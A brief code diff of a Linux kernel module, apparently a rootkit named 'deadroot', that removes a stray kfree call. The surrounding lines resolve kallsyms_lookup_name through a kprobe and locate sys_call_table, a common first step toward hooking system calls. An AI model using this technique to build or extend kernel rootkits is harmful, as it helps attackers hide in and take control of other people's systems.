@@ -114,7 +114,6 @@ static int __init deadroot_init(void){
 	register_kprobe(&kp);
 	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
 	unregister_kprobe(&kp);
-	kfree(&kp);
 	
 	// Getting syscall table address
 	__sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
